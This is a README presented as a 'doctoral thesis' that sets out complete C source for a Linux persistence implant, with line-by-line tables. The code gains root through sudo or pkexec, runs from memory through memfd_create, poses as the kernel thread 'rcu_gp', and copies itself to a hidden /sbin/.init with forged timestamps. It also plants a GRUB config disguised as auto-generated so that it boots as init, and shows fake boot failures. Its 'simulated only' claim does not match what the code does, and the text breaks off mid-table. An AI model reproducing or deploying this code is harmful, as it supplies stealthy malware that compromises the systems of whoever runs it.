# 🐧 linux-init-research


<div align="center">

```
╔══════════════════════════════════════════════════════════════════╗
║                    DOCTORAL RESEARCH THESIS                       ║
║                 Department of Computer Science                    ║
║                   Linux Kernel Internals Lab                      ║
╚══════════════════════════════════════════════════════════════════╝
```

[![Platform](https://img.shields.io/badge/platform-Linux-blue?logo=linux&logoColor=white)](https://www.linux.org/)
[![Language](https://img.shields.io/badge/language-C-00599C?logo=c)](https://en.wikipedia.org/wiki/C_(programming_language))
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Research](https://img.shields.io/badge/type-Doctoral%20Thesis-8A2BE2)]()

**Author:** Vladislav Khudash  
**Age:** 17  
**Location:** Ukraine  
**Date:** 02.04.2026  
**Project:** LINUX-INIT-RESEARCH  
**Platform:** LINUX

</div>

---

## ⚠️ DISSERTATION NOTICE

<div align="center">

| | |
|---|---|
| **📜 Academic Purpose** | This work is submitted for educational understanding of Linux internals |
| **🔬 Research Scope** | Controlled laboratory environments ONLY |
| **⚖️ Legal Notice** | Unauthorized application violates computer fraud laws |
| **🧪 Testing** | Simulated environment only — No live systems |

</div>

---

## 📖 Table of Contents

- [English](#english)
  - [1. Abstract](#1-abstract)
  - [2. System Architecture](#2-system-architecture)
  - [3. Complete Source Code Analysis](#3-complete-source-code-analysis)
  - [4. System Call Reference](#4-system-call-reference)
  - [5. Conclusion](#5-conclusion)

- [Русский](#русский)
  - [1. Аннотация](#1-аннотация)
  - [2. Архитектура системы](#2-архитектура-системы)
  - [3. Полный анализ исходного кода](#3-полный-анализ-исходного-кода)
  - [4. Справочник системных вызовов](#4-справочник-системных-вызовов)
  - [5. Заключение](#5-заключение)

---

# English

## 1. Abstract

This dissertation presents a **complete technical analysis** of Linux system programming techniques through the implementation of an init process simulator. The research demonstrates direct kernel interaction via system calls, bypassing the standard C library.

**Keywords:** Linux Kernel, System Calls, Init Process, memfd_create, execveat, Daemonization, RC4, GRUB2

---

## 2. System Architecture

### 2.1 High-Level Execution Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              PROGRAM ENTRY                                   │
│                                 main()                                       │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
                    ┌───────────────────────────────┐
                    │     Check if PID == 1 ?       │
                    └───────────────────────────────┘
                           │                │
                     YES   │                │   NO
                           ▼                ▼
              ┌─────────────────┐  ┌─────────────────────────┐
              │   init() Path   │  │   Normal Execution Path  │
              └─────────────────┘  └─────────────────────────┘
                      │                          │
                      ▼                          ▼
        ┌──────────────────────┐    ┌────────────────────────────┐
        │ Fork child for boot  │    │ Check if in memory already? │
        │ simulation output    │    │ (path starts with "/mem")   │
        └──────────────────────┘    └────────────────────────────┘
                      │                     │              │
                      ▼                YES  │              │  NO
        ┌──────────────────────┐            │              ▼
        │ Parent:              │            │   ┌──────────────────────┐
        │ - remount /          │            │   │ set_root() → sudo or │
        │ - scan target dir    │            │   │ pkexec elevation     │
        │ - modify GRUB        │            │   └──────────────────────┘
        │ - cleanup & reboot   │            │              │
        └──────────────────────┘            │              ▼
                                            │   ┌──────────────────────┐
                                            │   │ jump_to_ram()        │
                                            │   │ memfd_create +       │
                                            │   │ execveat             │
                                            │   └──────────────────────┘
                                            │              │
                                            └──────────────┘
                                                   ▼
                                    ┌──────────────────────────┐
                                    │ init_proc() - Daemonize  │
                                    │ loop() - Junk computation│
                                    │ setup_init() & setup_grub│
                                    │ Main loop with periodic  │
                                    │ persistence checks       │
                                    └──────────────────────────┘
```

### 2.2 Fileless Execution Pipeline

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         FILELESS EXECUTION PIPELINE                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  1. memfd_create("", MFD_ALLOW_SEALING)                                     │
│     │                                                                       │
│     ▼                                                                       │
│     ┌─────────────────────────────────────────────────────────────┐         │
│     │              Anonymous In-Memory File (memfd)                │         │
│     │                     File Descriptor: md                      │         │
│     └─────────────────────────────────────────────────────────────┘         │
│                                                                             │
│  2. openat(original_binary, O_RDONLY)                                       │
│     │                                                                       │
│     ▼                                                                       │
│     ┌─────────────────────────────────────────────────────────────┐         │
│     │              Original Binary on Disk                         │         │
│     │                     File Descriptor: fd                      │         │
│     └─────────────────────────────────────────────────────────────┘         │
│                                                                             │
│  3. sendfile(md, fd, NULL, size)                                            │
│     │     │                                                                 │
│     │     └─────────── Zero-copy kernel transfer ──────────────┐            │
│     ▼                                                          │            │
│     ┌──────────────────────────────────────────────────────────────┐        │
│     │  Kernel copies data directly from page cache to memfd        │        │
│     │  NO userspace buffer involved!                               │        │
│     └──────────────────────────────────────────────────────────────┘        │
│                                                                             │
│  4. fcntl(md, F_ADD_SEALS, F_SEAL_SHRINK|F_SEAL_GROW|F_SEAL_WRITE|...)     │
│     │                                                                       │
│     ▼                                                                       │
│     ┌─────────────────────────────────────────────────────────────┐         │
│     │              Memory File is SEALED                           │         │
│     │         Cannot be modified, shrunk, or grown                 │         │
│     └─────────────────────────────────────────────────────────────┘         │
│                                                                             │
│  5. execveat(md, "", argv, environ, AT_EMPTY_PATH)                          │
│     │                                                                       │
│     ▼                                                                       │
│     ┌─────────────────────────────────────────────────────────────┐         │
│     │              NEW PROCESS EXECUTED                            │         │
│     │         Runs entirely from memory — NO DISK TRACE            │         │
│     └─────────────────────────────────────────────────────────────┘         │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 2.3 Daemonization Process

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                          DAEMONIZATION SEQUENCE                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Parent Process                                                            │
│        │                                                                    │
│        │ fork()                                                             │
│        ▼                                                                    │
│   ┌─────────────┐     ┌─────────────┐                                       │
│   │   Parent    │     │   Child 1   │                                       │
│   │   _exit(0)  │     │   setsid()  │                                       │
│   └─────────────┘     └─────────────┘                                       │
│           │                  │                                              │
│           ▼                  │ fork()                                       │
│      [EXITS]                 ▼                                              │
│                        ┌─────────────┐     ┌─────────────┐                   │
│                        │   Parent    │     │   Child 2   │                   │
│                        │   _exit(0)  │     │  (Daemon)   │                   │
│                        └─────────────┘     └─────────────┘                   │
│                              │                    │                          │
│                              ▼                    ▼                          │
│                         [EXITS]           ┌──────────────────┐               │
│                                          │ prctl(PR_SET_NAME,│               │
│                                          │      "rcu_gp")    │               │
│                                          ├──────────────────┤               │
│                                          │ dup2 to /dev/null│               │
│                                          │ chdir("/")       │               │
│                                          │ umask(022)       │               │
│                                          │ setpriority(+18) │               │
│                                          │ PR_SET_DUMPABLE  │               │
│                                          └──────────────────┘               │
│                                                   │                          │
│                                                   ▼                          │
│                                          ┌──────────────────┐               │
│                                          │  DAEMON RUNNING  │               │
│                                          │  (Background)    │               │
│                                          └──────────────────┘               │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 2.4 GRUB Modification Flow

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         GRUB CONFIGURATION FLOW                              │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   ┌─────────────────────────────────────────────────────────────────┐       │
│   │                    setup_grub()                                  │       │
│   │  Creates: /etc/default/grub.d/99_custom.cfg                     │       │
│   │  Content:                                                        │       │
│   │  ┌───────────────────────────────────────────────────────────┐  │       │
│   │  │ GRUB_TIMEOUT=0                                            │  │       │
│   │  │ GRUB_CMDLINE_LINUX_DEFAULT="... init=/sbin/.init ..."    │  │       │
│   │  └───────────────────────────────────────────────────────────┘  │       │
│   └─────────────────────────────────────────────────────────────────┘       │
│                                    │                                        │
│                                    ▼                                        │
│   ┌─────────────────────────────────────────────────────────────────┐       │
│   │                    update_grub()                                 │       │
│   │  Opens: /boot/grub/grub.cfg (or /boot/grub2/grub.cfg)          │       │
│   │                                                                  │       │
│   │  Searches for: "init=/sbin/.init quiet nosplash"                │       │
│   │                                                                  │       │
│   │  ┌─────────────────────────────────────────────────────────┐    │       │
│   │  │ If found → overwrite with SPACES (preserves file size)  │    │       │
│   │  └─────────────────────────────────────────────────────────┘    │       │
│   │                                                                  │       │
│   │  Writes back modified content                                   │       │
│   └─────────────────────────────────────────────────────────────────┘       │
│                                    │                                        │
│                                    ▼                                        │
│   ┌─────────────────────────────────────────────────────────────────┐       │
│   │                    ON NEXT BOOT                                  │       │
│   │  Kernel loads with: init=/sbin/.init                            │       │
│   │  → Custom init process runs as PID 1                            │       │
│   └─────────────────────────────────────────────────────────────────┘       │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Complete Source Code Analysis

<details>
<summary><b>📁 Chapter 1: Header Files & Macro Definitions</b></summary>

```c
//===================================\\
// [ OWNER ]
//     CREATOR  : Vladislav Khudash
//     AGE      : 17
//     LOCATION : Ukraine
//
// [ PINFO ]
//     DATE     : 02.04.2026
//     PROJECT  : LINUX-INIT-RESEARCH
//     PLATFORM : LINUX
//===================================\\

#define _GNU_SOURCE
#include <stdint.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <fcntl.h>

#define DIR "/tmp"

#define DT_DIR          4
#define DT_REG          8 

#define MS_REMOUNT      32

#define FS_IOC_GETFLAGS 0x80086601
#define FS_IOC_SETFLAGS 0x40086602
#define FS_IMMUTABLE_FL 0x00000010
#define FS_APPEND_FL    0x00000020

#define U(i) ((long)(i))
#define FUNC static __attribute__((always_inline)) inline

#define _exit(n) syscall(SYS_exit_group, U(n))
#define sopen(p,f,a) syscall(SYS_openat, AT_FDCWD, U(p), U(f), U(a))
#define sclose(fd) syscall(SYS_close, U(fd))
```

**Explanation:**

| Line | Purpose |
|------|---------|
| `#define _GNU_SOURCE` | Enables Linux-specific extensions like `sendfile`, `memfd_create` |
| `#define DIR "/tmp"` | Working directory for filesystem operations |
| `DT_DIR` / `DT_REG` | Directory entry types from `getdents64` syscall |
| `MS_REMOUNT` | Mount flag for remounting filesystems |
| `FS_IOC_*` | ioctl commands for filesystem attribute manipulation |
| `FS_IMMUTABLE_FL` | ext2/3/4 immutable flag (prevents modification) |
| `FS_APPEND_FL` | ext2/3/4 append-only flag |
| `U(i)` | Casts argument to `long` for syscall ABI compatibility |
| `FUNC` | Forces function inlining to reduce overhead |
| `_exit(n)` | Wrapper for `exit_group` syscall |
| `sopen(p,f,a)` | Wrapper for `openat` syscall |
| `sclose(fd)` | Wrapper for `close` syscall |

</details>

<details>
<summary><b>📁 Chapter 2: Data Structure Definitions</b></summary>

```c
struct r_timeval {
    long    tv_sec;  
    long    tv_usec; 
};

struct r_timespec {
    long    tv_sec;
    long    tv_nsec;
};

struct dirent64_t {
    uint64_t    d_ino;
    int64_t     d_off;
    uint16_t    d_reclen;
    uint8_t     d_type;
    char        d_name[];
};
```

**Explanation:**

| Structure | Purpose |
|-----------|---------|
| `r_timeval` | Time value for `select()` syscall (seconds + microseconds) |
| `r_timespec` | Time specification for `nanosleep()` (seconds + nanoseconds) |
| `dirent64_t` | Directory entry format returned by `getdents64` |
| `d_ino` | Inode number |
| `d_off` | Offset to next entry |
| `d_reclen` | Length of this record |
| `d_type` | File type (DT_DIR=4, DT_REG=8) |
| `d_name[]` | Flexible array member — null-terminated filename |

</details>

<details>
<summary><b>📁 Chapter 3: Privilege Escalation — set_root()</b></summary>

```c
FUNC void set_root(const char *p) {
    if (syscall(SYS_getuid) == 0)
        return;
    
    
    extern char **environ;
    const  char *exe = "/usr/bin/sudo"; 
    

    for (char **e = environ;  e && (*e);  e++) {
        char *v = (*e); 

        if (
            ( (v[0] == 'D') && (v[1] == 'I') && (v[2] == 'S') && (v[3] == 'P') ) || 
            ( (v[0] == 'W') && (v[1] == 'A') && (v[2] == 'Y') && (v[3] == 'L') )
        ) {
            exe = "/usr/bin/pkexec";
            break;
        }
    }


    char *arg[] = { (char*)exe, (char*)p, NULL };
    syscall(SYS_execve, U(exe), U(arg), U(environ));

  
    _exit(0);
}
```

**Line-by-Line Analysis:**

| Line | Code | Explanation |
|------|------|-------------|
| 2 | `syscall(SYS_getuid) == 0` | Check if already root (UID 0) — if so, return immediately |
| 5 | `extern char **environ` | Access global environment variable array |
| 6 | `exe = "/usr/bin/sudo"` | Default elevation binary for terminal sessions |
| 8-17 | `for (char **e = environ...)` | Iterate through all environment variables |
| 11-14 | Check for `DISPLAY` or `WAYLAND` | Detect graphical session indicators |
| 13 | `exe = "/usr/bin/pkexec"` | Use PolicyKit for GUI elevation |
| 21 | `char *arg[] = {...}` | Build argument vector for execve |
| 22 | `syscall(SYS_execve, ...)` | Replace current process with elevated one |
| 24 | `_exit(0)` | Exit if execve fails (should never reach here) |

**Why Two Methods?**
- `sudo` — Works in terminal sessions (SSH, TTY)
- `pkexec` — Works in graphical sessions (PolicyKit authentication dialog)

</details>

<details>
<summary><b>📁 Chapter 4: Fileless Execution — jump_to_ram()</b></summary>

```c
FUNC void jump_to_ram(const char *p) {
    int md = syscall(SYS_memfd_create, U(""), 2U);

    if (md < 0) 
        return;


    int fd = sopen(p, O_RDONLY|O_NOATIME, 0);

    if (fd < 0) {
        sclose(md);
        return;
    }


    struct stat st;

    if (syscall(SYS_fstat, U(fd), &st) != 0) {
        sclose(fd);
        sclose(md);
        return;
    }

    long sz = st.st_size;


    long off = 0;

    while (off < sz) {
        long r = syscall(SYS_sendfile, U(md), U(fd), NULL, U(sz - off));

        if (r <= 0) 
            break;

        off += r;
    }

    sclose(fd);

    if (off < sz) {
        sclose(md);
        return;
    }


    syscall(SYS_fcntl, U(md), U(F_ADD_SEALS), U(F_SEAL_SHRINK|F_SEAL_GROW|F_SEAL_WRITE|F_SEAL_SEAL));

    
    char *const arg[] = { "[rcu_gp]", NULL };
    extern char **environ;
    syscall(SYS_execveat, U(md), U(""), U(arg), U(environ), U(AT_EMPTY_PATH));
    

    _exit(0);
}
```

**Step-by-Step Breakdown:**

| Step | Lines | Syscall | Purpose |
|------|-------|---------|---------|
| 1 | 2-5 | `memfd_create("", 2)` | Create anonymous file in RAM (2 = MFD_ALLOW_SEALING) |
| 2 | 8-12 | `sopen(p, O_RDONLY\|O_NOATIME)` | Open original binary from disk |
| 3 | 16-21 | `fstat(fd, &st)` | Get file size |
| 4 | 25-33 | `sendfile(md, fd, ...)` | Zero-copy transfer from disk to memory |
| 5 | 35 | `sclose(fd)` | Close disk file |
| 6 | 37-40 | Error check | Verify all bytes transferred |
| 7 | 43 | `fcntl(md, F_ADD_SEALS, ...)` | Seal memory file from modification |
| 8 | 46-48 | `execveat(md, "", ..., AT_EMPTY_PATH)` | Execute from memory fd |
| 9 | 51 | `_exit(0)` | Should never reach here |

**Seal Flags Explained:**

| Flag | Meaning |
|------|---------|
| `F_SEAL_SHRINK` | Cannot reduce file size |
| `F_SEAL_GROW` | Cannot increase file size |
| `F_SEAL_WRITE` | Cannot write to file |
| `F_SEAL_SEAL` | Cannot add more seals |

</details>

<details>
<summary><b>📁 Chapter 5: Daemonization — init_proc()</b></summary>

```c
FUNC void init_proc(void) {
    if (syscall(SYS_fork) != 0) 
        _exit(0);

    syscall(SYS_setsid);
        
    if (syscall(SYS_fork) != 0) 
        _exit(0);

    syscall(SYS_prctl, U(PR_SET_NAME), U("rcu_gp"), 0, 0, 0);


    int fd = sopen("/dev/null", O_RDWR, 0);

    if (fd != -1) {
        syscall(SYS_dup2, U(fd), 0);
        syscall(SYS_dup2, U(fd), 1); 
        syscall(SYS_dup2, U(fd), 2); 

        if (fd > 2) 
            sclose(fd);
    }
        

    syscall(SYS_umask, 022);
    syscall(SYS_chdir, U("/"));


    syscall(SYS_setpriority, 0, 0, 18);
    syscall(SYS_prctl, U(PR_SET_TIMERSLACK), U(100000000), 0, 0, 0);
    syscall(SYS_prctl, U(PR_SET_THP_DISABLE), 1, 0, 0, 0);
    syscall(SYS_prctl, U(PR_SET_DUMPABLE), 0, 0, 0, 0);
}
```

**Classic Double-Fork Pattern:**

| Step | Code | Purpose |
|------|------|---------|
| 1 | `fork() != 0 → _exit(0)` | Parent exits, child continues |
| 2 | `setsid()` | Create new session, become session leader |
| 3 | `fork() != 0 → _exit(0)` | Session leader exits, grandchild cannot regain terminal |
| 4 | `prctl(PR_SET_NAME, "rcu_gp")` | Masquerade as kernel thread |
| 5 | `open("/dev/null")` | Open null device |
| 6 | `dup2(fd, 0/1/2)` | Redirect stdin/stdout/stderr to /dev/null |
| 7 | `chdir("/")` | Change to root directory (prevents unmount issues) |
| 8 | `umask(022)` | Set file creation mask |
| 9 | `setpriority(..., 18)` | Lower priority (nice value) |
| 10 | `PR_SET_TIMERSLACK` | Increase timer slack for power saving |
| 11 | `PR_SET_THP_DISABLE` | Disable Transparent Huge Pages |
| 12 | `PR_SET_DUMPABLE, 0` | Disable core dumps |

</details>

<details>
<summary><b>📁 Chapter 6: Timing Obfuscation — loop()</b></summary>

```c
FUNC void loop(void) {
    #define WORKERS 256
    volatile uint64_t cache[WORKERS];
    volatile uint64_t checksum = 0;

    for (int i = 0;  i < WORKERS;  i++) 
        cache[i] = (uint64_t)i * 0x9E3779B97F4A7C15ULL; 

    for (int i = 0;  i < WORKERS - 1;  i++) {
        cache[i] ^= cache[i + 1];
        checksum += cache[i] ^ (checksum >> 3);
    }


    struct r_timeval tv;
    tv.tv_sec = 8;
    tv.tv_usec = (checksum % 500) * 1000; 
    syscall(SYS_select, 0, NULL, NULL, NULL, U(&tv));


    struct r_timespec ts;
    ts.tv_sec = 1;
    ts.tv_nsec = (checksum % 200) * 1000000; 
    syscall(SYS_nanosleep, U(&ts), NULL);
}
```

**Analysis:**

| Element | Purpose |
|---------|---------|
| `volatile` | Prevents compiler from optimizing away junk computations |
| `0x9E3779B97F4A7C15ULL` | Golden ratio constant (φ × 2^64) — produces pseudo-random values |
| `checksum % 500` | Generates variable microsecond delay |
| `select(NULL, ...)` | Used as portable sleep (waits on no file descriptors) |
| `nanosleep(...)` | High-resolution sleep with pseudo-random duration |

**Why This Matters:**
- Makes static analysis more difficult
- Introduces non-deterministic timing
- Complicates debugging and tracing

</details>

<details>
<summary><b>📁 Chapter 7: Init Binary Setup — setup_init()</b></summary>

```c
FUNC void setup_init(void) {
    const char *p = "/sbin/.init";
    struct stat st;


    if (syscall(SYS_stat, U(p), &st) == 0) 
        return;


    int src = sopen("/proc/self/exe", O_RDONLY|O_NOATIME, 0);

    if (src < 0) 
        return;


    if (syscall(SYS_fstat, U(src), &st) != 0) {
        sclose(src);
        return;
    }

    long sz = st.st_size;


    int dst = sopen(p, O_WRONLY|O_CREAT|O_TRUNC|O_NOATIME, 0755);

    if (dst < 0) {
        sclose(src);
        return;
    }


    long off = 0;

    while (off < sz) {
        long r = syscall(SYS_sendfile, U(dst), U(src), NULL, U(sz - off));

        if (r <= 0) 
            break;

        off += r;
    }


    sclose(src);
    sclose(dst);


    struct stat sti;

    if (syscall(SYS_stat, U("/sbin/init"), &sti) == 0) {
        struct timespec t[2] = {sti.st_atim, sti.st_mtim};
        syscall(SYS_utimensat, AT_FDCWD, U(p), U(t), 0);
    }
}
```

**Step-by-Step:**

| Step | Code | Purpose |
|------|------|---------|
| 1 | `stat("/sbin/.init")` | Check if already installed |
| 2 | `open("/proc/self/exe")` | Open current executable |
| 3 | `fstat()` | Get file size |
| 4 | `open("/sbin/.init", O_CREAT\|...)` | Create destination file (0755 permissions) |
| 5 | `sendfile(dst, src, ...)` | Copy executable content |
| 6 | `stat("/sbin/init")` | Get original init timestamps |
| 7 | `utimensat(...)` | Copy timestamps to hide modification time |

</details>

<details>
<summary><b>📁 Chapter 8: GRUB Configuration — setup_grub()</b></summary>

```c
FUNC void setup_grub(void) {
    const char *dr = "/etc/default/grub.d";
    const char *fp = "/etc/default/grub.d/99_custom.cfg";
    const char *dt = 
        "#\n"
        "# DO NOT EDIT THIS FILE\n"
        "#\n"
        "# It is automatically generated by grub-mkconfig using templates\n"
        "# from /etc/grub.d and settings from /etc/default/grub\n"
        "#\n\n"
        "### BEGIN /etc/grub.d/40_custom ###\n"
        "GRUB_TIMEOUT=0\n"
        "GRUB_CMDLINE_LINUX_DEFAULT=\"$GRUB_CMDLINE_LINUX_DEFAULT init=/sbin/.init quiet nosplash\"\n"
        "### END /etc/grub.d/40_custom ###\n";


    struct stat st;

    if (syscall(SYS_stat, U("/etc/default"), &st) != 0) 
        return;

    struct timespec t[2] = {st.st_atim, st.st_mtim};

    
    struct stat stdr;

    if (syscall(SYS_stat, U(dr), &stdr) != 0) {
        syscall(SYS_mkdir, U(dr), 0755);
        syscall(SYS_utimensat, AT_FDCWD, U(dr), U(t), 0);
    }


    int fd = sopen(fp, O_WRONLY|O_CREAT|O_TRUNC|O_NOATIME, 0644);

    if (fd == -1) 
        return;


    int l = -1;
    while (dt[++l]);


    long off = 0;
  
    while (off < l) {
        long r = syscall(SYS_write, U(fd), U(dt + off), U(l - off));

        if (r <= 0) 
            break; 

        off += r;
    }


    syscall(SYS_fdatasync, U(fd));
    sclose(fd);


    syscall(SYS_utimensat, AT_FDCWD, U(fp), U(t), 0);
}
```

**GRUB Modification Strategy:**

| Step | Code | Purpose |
|------|------|---------|
| 1 | `stat("/etc/default")` | Get original timestamps for camouflage |
| 2 | `mkdir("/etc/default/grub.d")` | Create GRUB custom config directory |
| 3 | `utimensat(...)` | Set directory timestamps to match `/etc/default` |
| 4 | Write `dt` to `99_custom.cfg` | Create custom GRUB configuration |
| 5 | `fdatasync()` | Ensure data is written to disk |
| 6 | `utimensat(...)` | Set file timestamps to match `/etc/default` |

**Configuration Content:**
- `GRUB_TIMEOUT=0` — No boot menu delay
- `init=/sbin/.init` — Replace init process with custom binary
- `quiet nosplash` — Suppress boot messages

</details>

<details>
<summary><b>📁 Chapter 9: Console Output — iprint()</b></summary>

```c
static void iprint(const char *msg, int l) {
    if (l == -1) 
        while (msg[++l]);
    

    long r = syscall(SYS_write, 2, U(msg), U(l));

    if (r < 0)
        return;

    
    int fd = sopen("/dev/console", O_WRONLY|O_NOCTTY, 0);

    if (fd == -1) 
        return;

    syscall(SYS_write, U(fd), U(msg), U(l));
    sclose(fd);
}
```

**Explanation:**

| Line | Purpose |
|------|---------|
| 2-3 | Auto-calculate string length if `l == -1` |
| 6 | Write to stderr (fd 2) |
| 12-17 | Also write to `/dev/console` for visibility during boot |

</details>

<details>
<summary><b>📁 Chapter 10: Unit Description Parser — unit_desc()</b></summary>

```c
static int unit_desc(const char *name, char *out, int max) {
    char p[256] = "/lib/systemd/system/";


    int o = 12,  i = -1,  j = 0;

    while (p[++i]);
    while ( name[j] && (i < (sizeof(p) - 1)) ) 
        p[i++] = name[j++];

    p[i] = '\0';


    int fd = sopen(p, O_RDONLY|O_NOATIME, 0);

    if (fd == -1) 
        return 0;


    char buf[2048];
    int  r = syscall(SYS_read, U(fd), U(buf), U(sizeof(buf) - 1));


    if (r < 0) 
        r = 0; 

    buf[r] = '\0';


    sclose(fd);


    if (r <= o) 
        return 0;

        
    for (int k = 0;  k < (r - o);  k++) {
        if ( 
            (buf[k + 1] == 'e') && (buf[k + 2] == 's') && (buf[k + 3] == 'c') && 
            (buf[k + 4] == 'r') && (buf[k + 5] == 'i') && (buf[k + 6] == 'p') &&
                                   (buf[k + 11] == '=') 
        ) {
            int s = k + o;
            int n = 0;


            while ( (s < r) && (buf[s] != '\n') && (n < (max - 1)) ) 
                out[n++] = buf[s++];
            
            out[n] = '\0';


            return n;
        }
    }


    return 0;
}
```

**Parser Algorithm:**

| Step | Description |
|------|-------------|
| 1 | Build full path: `/lib/systemd/system/{name}` |
| 2 | Open unit file |
| 3 | Read entire file into buffer |
| 4 | Search for `Description=` field |
| 5 | Extract value until newline |
| 6 | Return description string |

</details>

<details>
<summary><b>📁 Chapter 11: Boot Output Simulator — output()</b></summary>

```c
FUNC void output(void) {
    #define IS_MOUNT( l, name)  ( ((l) > 6) && (name[l - 6] == '.') && (name[l - 5] == 'm') && (name[l - 4] == 'o') && (name[l - 3] == 'u') && (name[l - 2] == 'n') && (name[l - 1] == 't')                         )
    #define IS_SOCKET(l, name)  ( ((l) > 7) && (name[l - 7] == '.') && (name[l - 6] == 's') && (name[l - 5] == 'o') && (name[l - 4] == 'c') && (name[l - 3] == 'k') && (name[l - 2] == 'e') && (name[l - 1] == 't') )
    #define IS_DEVICE(l, name)  ( ((l) > 7) && (name[l - 7] == '.') && (name[l - 6] == 'd') && (name[l - 5] == 'e') && (name[l - 4] == 'v') && (name[l - 3] == 'i') && (name[l - 2] == 'c') && (name[l - 1] == 'e') )
    #define IS_TIMER( l, name)  ( ((l) > 6) && (name[l - 6] == '.') && (name[l - 5] == 't') && (name[l - 4] == 'i') && (name[l - 3] == 'm') && (name[l - 2] == 'e') && (name[l - 1] == 'r')                         )
    #define IS_TARGET(l, name)  ( ((l) > 7) && (name[l - 7] == '.') && (name[l - 6] == 't') && (name[l - 5] == 'a') && (name[l - 4] == 'r') && (name[l - 3] == 'g') && (name[l - 2] == 'e') && (name[l - 1] == 't') )
    
    
    #define PRINT_DESC(d, l)                                        \
        do {                                                        \
            if ((l) > 0) { iprint(" - ", 3); iprint((d), (l)); }    \
        } while (0)
    


    int fd = sopen("/lib/systemd/system", O_RDONLY|O_DIRECTORY|O_NOATIME, 0);

    if (fd < 0) {
        iprint("\033[0;1;31m[ FATAL ]\033[0m Failed to mount /lib/systemd/system: No such file or directory\n", -1);
        iprint("Entering emergency mode. Exit shell to continue.\n", -1);
        syscall(SYS_nanosleep, U((&(struct r_timespec){3, 0})), NULL);
        iprint("\033[2J\033[H", -1);
        return;
    }

    
    char buf[4096];
    char desc[256];
    int  n,  t = 0;
    uint32_t f = 7;


    iprint("\nWelcome to Linux!\n\n", -1);


    while ( 
        ( n = syscall(SYS_getdents64, U(fd), U(buf), U(sizeof(buf))) ) > 0 
    ) {
        for (int i = 0; i < n;) {
            struct dirent64_t *d = (struct dirent64_t*)(buf + i);

            if ((d->d_reclen) < sizeof(struct dirent64_t)) 
                break;


            char *name = (d->d_name);
            int  l     = -1;
            while (name[++l]);


            if (name[0] == '.') {
                i += (d->d_reclen);
                continue;
            }


            uint32_t rng = ((name[0] + t) + f) % 100;
            int      dln = unit_desc(name, desc, sizeof(desc));


            if (IS_MOUNT(l, name)) {
                iprint("          Mounting ", 19);
                iprint(name, l);
                iprint("...\n", 4);


                syscall(SYS_nanosleep, U((&(struct r_timespec){0, 60000000})), NULL);


                iprint("\033[0;32m[  OK  ]\033[0m Mounted ", -1);
                iprint(name, l);
                PRINT_DESC(desc, dln);
                iprint(".\n", 2);
            }


            else if (IS_SOCKET(l, name)) {
                iprint("          Starting Listening on ", 32);
                iprint(name, l);
                iprint("...\n", 4);


                syscall(SYS_nanosleep, U((&(struct r_timespec){0, 40000000})), NULL);


                iprint("\033[0;32m[  OK  ]\033[0m Listening on ", -1);
                iprint(name, l);
                PRINT_DESC(desc, dln);
                iprint(".\n", 2);
            }


            else if (IS_TIMER(l, name)) {
                iprint("          Started ", 18);
                iprint(name, l);
                iprint(".\n", 2);


                syscall(SYS_nanosleep, U((&(struct r_timespec){0, 30000000})), NULL);


                iprint("\033[0;32m[  OK  ]\033[0m Reached target Timers.\n", -1);
            }


            else if (IS_TARGET(l, name)) {
                iprint("\033[0;32m[  OK  ]\033[0m Reached target ", -1);
                iprint(name, l - 7);
                PRINT_DESC(desc, dln);
                iprint(".\n", 2);


                syscall(SYS_nanosleep, U((&(struct r_timespec){0, 10000000})), NULL);
            }


            else {
                if (rng < 10) {
                    int w = 3 + (rng % 57);

                    for (int sec = 1; sec <= w; sec++) {
                        iprint("\r\033[0;33m[ *** ]\033[0m A start job is running for ", -1);
                        iprint(name, l);
                        iprint(" (", 2);

                        if (sec > 9) {
                            char c = (sec / 10) + '0';
                            iprint(&c, 1);
                        }

                        char s = (sec % 10) + '0';
                        iprint(&s, 1);
                        iprint("s / 1min 30s)", 13);


                        syscall(SYS_nanosleep, U((&(struct r_timespec){1, 0})), NULL);
                    }


                    iprint("\n\033[0;1;31m[ TIME ]\033[0m Timed out starting ", -1);
                    iprint(name, l);
                    iprint(".\n", 2);


                    f += 5;
                }


                else if ( (rng > 90) && (rng < 96) ) {
                    iprint("\033[0;31m[FAILED]\033[0m Failed to start ", -1);
                    iprint(name, l);
                    PRINT_DESC(desc, dln);
                    iprint(".\nSee 'systemctl status ", -1);
                    iprint(name, l);
                    iprint("' for details.\n", -1);


                    f += 3;
                }


                else {
                    iprint("          Starting ", 19);
                    iprint(name, l);
                    iprint("...\n", 4);


                    syscall(SYS_nanosleep, U((&(struct r_timespec){0, 30000000 + (rng * 1000000)})), NULL);


                    iprint("\033[0;32m[  OK  ]\033[0m Started ", -1);
                    iprint(name, l);
                    PRINT_DESC(desc, dln);
                    iprint(".\n", 2);


                    if (f > 2) 
                        f--;
                }
            }


            t++;
            i += (d->d_reclen);

        } 
    }


    iprint("\n\033[0;1;31m[ FATAL ]\033[0m Failed to start systemd-journald.service", -1);
    iprint("\n\033[0;1;31m[ FATAL ]\033[0m Failed to spawn init process", -1);


    iprint("\n\033[1;37m[ INFO ]\033[0m Attempting restart to systemd...", -1);
    syscall(SYS_nanosleep, U((&(struct r_timespec){3, 0})), NULL);
    iprint("\033[2J\033[H", -1);


    sclose(fd);
}
```

**Unit Type Detection Macros:**

| Macro | Detects | Example |
|-------|---------|---------|
| `IS_MOUNT` | `.mount` units | `dev-hugepages.mount` |
| `IS_SOCKET` | `.socket` units | `dbus.socket` |
| `IS_DEVICE` | `.device` units | `sys-devices.device` |
| `IS_TIMER` | `.timer` units | `systemd-tmpfiles-clean.timer` |
| `IS_TARGET` | `.target` units | `basic.target` |

**Simulation Probabilities:**

| Condition | Probability | Action |
|-----------|-------------|--------|
| `rng < 10` | 10% | Simulate hanging job with countdown |
